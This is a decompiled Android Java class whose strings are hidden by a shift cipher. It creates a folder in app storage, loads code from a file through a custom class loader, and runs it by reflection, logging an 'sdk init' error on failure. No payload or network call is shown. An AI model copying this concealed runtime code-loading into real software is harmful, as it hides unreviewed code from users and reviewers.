package com.x.zg;

import android.content.Context;
import android.util.Log;
import java.io.File;

/* loaded from: classes.dex */
final class b implements Runnable {
    final /* synthetic */ Context a;
    final /* synthetic */ String b;

    /* JADX INFO: Access modifiers changed from: package-private */
    public b(Context context, String str) {
        this.a = context;
        this.b = str;
    }

    @Override // java.lang.Runnable
    public final void run() {
        int parseFloat = (int) ((Float.parseFloat(a.a("625", 4)) * 10.0f) % 2.0f);
        File file = new File(this.a.getFilesDir(), o.a(a.a("uu6", 7), parseFloat));
        if (!file.exists()) {
            file.mkdirs();
        }
        m a = n.a(file + o.a(a.a("tcl0j01", 1), parseFloat));
        if (a == null) {
            Log.i(a.a("zkr", 7), a.a("ufm\"kpkv\"gttqt\"pwnn", 2));
            return;
        }
        try {
            Class<?> a2 = new o(a.a.getAbsolutePath(), file.getAbsolutePath(), parseFloat).a(a.d);
            a2.getMethod(a.e, Context.class, String.class).invoke(a2, this.a, this.b);
        } catch (Exception e) {
            e.printStackTrace();
            Log.i(a.a("yjq", 6), a.a("xip%nsny%jwwtw%", 5) + e.getLocalizedMessage());
        }
    }
}
